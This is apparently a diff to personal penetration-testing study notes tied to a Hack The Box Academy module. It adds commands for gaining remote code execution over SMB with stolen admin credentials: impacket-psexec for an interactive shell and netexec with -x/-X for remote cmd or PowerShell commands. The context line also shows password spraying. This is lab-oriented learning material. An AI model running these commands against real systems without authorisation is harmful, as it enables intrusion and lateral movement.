@@ -86,10 +86,21 @@ nxc smb <ip> -u <path_to_usernamelist> -p '<password>' --continue-on-success #pa
 
 Post Exploit / Credential Gathering:
 
-After we have gained valid credentials, we can archive RCE by using impacket-PsExec, impacket-SMBExec, Impacket-atexec or netexec:
+After we have gained valid credentials with admin right, we can archive RCE by using impacket-PsExec, impacket-SMBExec, Impacket-atexec or netexec:
 
-Impacket-series:
+Impacket-series(preferred):
 ```
 impacket-psexec <username>:'<password>'@<ip>
+#This would open us a interactive shell
 ```
+
+NetExec:
+```
+nxc smb <ip> -u <username> -p '<password>' -x '<command>' 
+#Replace -x with -X if we need powershell instead of cmd
+```
+
+
+
+
 Ref: https://academy.hackthebox.com/app/module/112/section/1067
